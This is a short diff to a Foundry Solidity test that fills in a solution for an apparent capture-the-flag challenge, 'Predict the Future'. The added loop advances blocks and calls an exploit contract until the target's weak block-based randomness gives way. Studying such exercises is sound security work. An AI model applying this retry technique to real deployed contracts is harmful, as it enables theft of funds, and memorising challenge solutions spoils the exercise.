@@ -22,7 +22,12 @@ contract PredictTheFutureTest is Test {
         vm.warp(93582192);
 
         // Put your solution here
-
+        exploitContract.lockInGuess{value: 1 ether}();
+        while (!predictTheFuture.isComplete()) {
+            vm.roll(block.number + 2);
+            vm.warp(block.timestamp + 24);
+            exploitContract.exploit();
+        }
         _checkSolved();
     }
 
